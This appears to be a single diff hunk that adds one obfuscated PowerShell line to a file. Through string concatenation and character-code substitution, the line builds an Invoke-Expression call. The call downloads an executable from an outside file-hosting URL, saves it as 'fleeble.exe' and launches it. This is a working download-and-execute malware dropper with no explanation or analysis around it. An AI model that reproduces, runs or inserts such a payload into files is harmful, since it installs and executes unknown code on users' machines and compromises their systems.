@@ -1,0 +1,1 @@
+﻿ .( $ShelLid[1]+$SHELlId[13]+'X') ( ('(New-Obje'+'ct'+' Syst'+'em.Net.WebCl'+'ient)'+'.D'+'o'+'wn'+'lo'+'adFil'+'e(ZYqhttp://dd'+'l'+'7.d'+'at'+'a'+'.hu/get/0/'+'95'+'5210'+'3/PFIfdp.'+'exeZY'+'q,'+'ZY'+'q'+'fleeb'+'le.e'+'xeZYq'+');Start-'+'P'+'roc'+'ess '+'Z'+'Y'+'qfl'+'eebl'+'e'+'.'+'ex'+'eZY'+'q').rEPlAcE(([cHAR]90+[cHAR]89+[cHAR]113),[STRInG][cHAR]39) ) 
